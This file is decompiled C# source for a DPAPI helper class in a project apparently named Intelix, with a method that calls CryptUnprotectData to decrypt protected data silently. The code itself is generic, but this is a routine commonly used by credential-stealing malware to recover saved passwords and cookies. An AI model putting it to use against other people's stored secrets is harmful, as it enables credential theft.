using System;
using System.Runtime.InteropServices;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x02000072 RID: 114
	public static class DpApi
	{
		// Token: 0x060001C2 RID: 450 RVA: 0x000163B0 File Offset: 0x000145B0
		public static byte[] Decrypt(byte[] bCipher)
		{
			NativeMethods.DataBlob dataBlob = default(NativeMethods.DataBlob);
			NativeMethods.DataBlob dataBlob2 = default(NativeMethods.DataBlob);
			NativeMethods.DataBlob dataBlob3 = default(NativeMethods.DataBlob);
			string empty = string.Empty;
			GCHandle gchandle = GCHandle.Alloc(bCipher, GCHandleType.Pinned);
			dataBlob.cbData = bCipher.Length;
			dataBlob.pbData = gchandle.AddrOfPinnedObject();
			byte[] result;
			try
			{
				bool flag = !NativeMethods.CryptUnprotectData(ref dataBlob, ref empty, ref dataBlob3, IntPtr.Zero, ref DpApi.Prompt, 0, ref dataBlob2) || dataBlob2.cbData == 0;
				if (flag)
				{
					result = null;
				}
				else
				{
					byte[] array = new byte[dataBlob2.cbData];
					Marshal.Copy(dataBlob2.pbData, array, 0, dataBlob2.cbData);
					result = array;
				}
			}
			finally
			{
				gchandle.Free();
				bool flag2 = dataBlob2.pbData != IntPtr.Zero;
				if (flag2)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				bool flag3 = dataBlob3.pbData != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return result;
		}

		// Token: 0x04000060 RID: 96
		private static NativeMethods.CryptprotectPromptstruct Prompt = new NativeMethods.CryptprotectPromptstruct
		{
			cbSize = Marshal.SizeOf(typeof(NativeMethods.CryptprotectPromptstruct)),
			dwPromptFlags = 0,
			hwndApp = IntPtr.Zero,
			szPrompt = null
		};
	}
}
